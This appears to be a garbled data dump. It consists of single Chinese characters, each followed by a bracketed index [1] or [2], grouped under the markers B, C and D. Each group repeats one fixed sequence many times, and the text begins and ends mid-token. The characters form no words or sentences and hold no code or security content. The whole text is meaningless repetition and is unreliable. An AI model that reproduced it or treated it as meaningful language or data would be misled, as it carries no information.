2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1]B国[2]作[1]能[2]都[2]体[1]当[1]使[1]好[2]形[1]你[1]但[1]命[2]位[1]转[1]白[2]车[1]影[1]低[1]何[1]置[1]住[1]罪[1]落[2]轮[1]施[2]轻[1]余[1]虽[2]尽[2]轴[1]载[1]载[2]罗[1]汽[2]宽[2]齐[1] C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1]C於[2]会[1]开[1]麼[2]式[1]强[1]导[2]张[1]传[1]众[1]值[2]眼[2]格[2]引[1]企[1]鱼[2]似[1]似[2]优[1]缺[1]演[1]伯[1]弦[1]缩[1]异[1]尼[2]伤[1]编[1]呼[2]伟[1]弱[1] D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2]维[1]养[2]满[1]细[1]价[1]死[2]黄[1]仅[1]续[1]轻[2]练[1]黑[1]击[2]继[1]画[2]令[1]绝[1]仍[1]移[2]终[1]刻[2]阻[2]医[2]攻[2]读[2]介[1]翻[2]绿[1]延[1]绍[1]滑[1]D以[1]他[1]们[1]主[2]经[1]从[1]去[2]结[1]建[1]系[2]代[1]总[2]活[2]件[1]统[1]组[1]任[1]任[2]给[1]治[2]什[1]类[2]离[2]今[1]织[1]须[2